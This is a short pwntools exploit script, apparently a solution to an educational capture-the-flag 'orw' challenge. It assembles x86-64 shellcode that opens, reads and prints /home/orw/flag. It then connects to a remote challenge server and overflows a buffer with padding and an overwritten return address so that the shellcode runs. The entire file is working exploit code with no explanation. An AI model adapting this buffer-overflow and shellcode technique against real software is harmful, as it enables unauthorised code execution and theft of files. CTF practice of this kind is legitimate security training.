from pwn import *

context.arch = 'amd64'

sh = asm(
        '''
        mov rax, 0x67616c662f77
        push rax
        mov rax, 0x726f2f656d6f682f # /home/orw/flag
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x02
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x80
        xor rax, rax
        syscall

        mov rdi, 0x01
        mov rax, 0x01
        syscall
        '''
        )

sh = asm(
        shellcraft.pushstr('/home/orw/flag') +
        shellcraft.open('rsp', 0, 0) +
        shellcraft.read('rax', 'rsp', 0x50) +
        shellcraft.write(1, 'rsp', 0x50)
        )
print(sh)

s = remote("edu-ctf.csie.org", 10171)

s.sendafter(">", sh)

s.sendlineafter( ':)' , str.encode('a' * 0x18) + p64( 0x6010a0 ) )

s.interactive()
